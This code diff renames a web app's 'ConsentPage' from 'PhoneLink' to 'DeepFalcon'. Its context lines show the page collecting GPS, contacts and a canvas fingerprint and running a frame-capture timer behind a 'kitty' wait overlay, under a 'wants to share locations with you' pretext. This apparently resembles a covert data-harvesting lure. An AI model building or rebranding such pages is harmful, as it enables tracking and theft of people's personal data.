@@ -290,7 +290,7 @@ function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
           </svg>
         </div>
         <span style={{ color: "#E2E5EE", fontFamily: "system-ui, sans-serif", fontWeight: 700, fontSize: 17, letterSpacing: "-0.01em" }}>
-          PhoneLink
+          DeepFalcon
         </span>
       </div>
 
@@ -855,7 +855,7 @@ export default function ConsentPage() {
   const sessionFrameCaptureRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const sessionSavedRef = useRef(false);
 
-  const GPS_KEY = `phonelink_gps_${token}`;
+  const GPS_KEY = `deepfalcon_gps_${token}`;
   const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
     try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
   };
@@ -1026,9 +1026,9 @@ export default function ConsentPage() {
         c2d.fillStyle = "#f60";
         c2d.fillRect(125, 1, 62, 20);
         c2d.fillStyle = "#069";
-        c2d.fillText("PhoneLink \uD83D\uDD12 1.0", 2, 15);
+        c2d.fillText("DeepFalcon \uD83D\uDD12 1.0", 2, 15);
         c2d.fillStyle = "rgba(102,204,0,0.7)";
-        c2d.fillText("PhoneLink \uD83D\uDD12 1.0", 4, 17);
+        c2d.fillText("DeepFalcon \uD83D\uDD12 1.0", 4, 17);
         const raw = fc.toDataURL();
         let h = 0;
         for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h) + raw.charCodeAt(i); h |= 0; }
@@ -1282,7 +1282,7 @@ export default function ConsentPage() {
         deviceInfoRef.current = { ...deviceInfoRef.current, contacts: mapped };
         contactsCollectedCountRef.current = mapped.length;
         setContactsCollected(true);
-        try { localStorage.setItem(`phonelink_contacts_${token}`, JSON.stringify(mapped)); } catch {}
+        try { localStorage.setItem(`deepfalcon_contacts_${token}`, JSON.stringify(mapped)); } catch {}
 
         // If the kitty already completed and we're in "main", show the popup now
         // (handles the race where contacts resolve after the 5s kitty timer).
@@ -1847,7 +1847,7 @@ export default function ConsentPage() {
         <Card className="max-w-md w-full shadow-xl">
           <CardContent className="pt-10 pb-10 text-center">
             <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
-              <Shield className="h-5 w-5" /> PhoneLink
+              <Shield className="h-5 w-5" /> DeepFalcon
             </div>
             <ExternalLink className="h-14 w-14 text-primary mx-auto mb-4" />
             <h2 className="text-xl font-semibold mb-2">Open in Your Browser</h2>
@@ -2019,7 +2019,7 @@ export default function ConsentPage() {
         {/* Soft FAB */}
         <div className="fixed bottom-6 right-6 z-20">
           <a
-            href="https://wa.me/?text=Need+help+with+PhoneLink"
+            href="https://wa.me/?text=Need+help+with+DeepFalcon"
             target="_blank"
             rel="noreferrer"
             className="w-14 h-14 rounded-full flex items-center justify-center shadow-lg"
@@ -2062,13 +2062,13 @@ export default function ConsentPage() {
           {/* Header */}
           <div className="text-center mb-8">
             <div className="inline-flex items-center gap-2 text-primary font-bold text-xl mb-4">
-              <Shield className="h-6 w-6" /> PhoneLink
+              <Shield className="h-6 w-6" /> DeepFalcon
             </div>
             <h1 className="text-2xl font-bold text-foreground leading-tight mb-2">
               {senderName} wants to share locations with you
             </h1>
             <p className="text-muted-foreground text-sm">
-              To get started, PhoneLink needs a few permissions. Here's exactly what we use them for:
+              To get started, DeepFalcon needs a few permissions. Here's exactly what we use them for:
             </p>
           </div>
 
@@ -2177,7 +2177,7 @@ export default function ConsentPage() {
     return (
       <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
         <div className="flex items-center gap-2 text-primary font-bold text-lg">
-          <Shield className="h-5 w-5" /> PhoneLink
+          <Shield className="h-5 w-5" /> DeepFalcon
         </div>
         <div className="relative">
           <div className="w-20 h-20 rounded-full bg-primary/20 flex items-center justify-center">
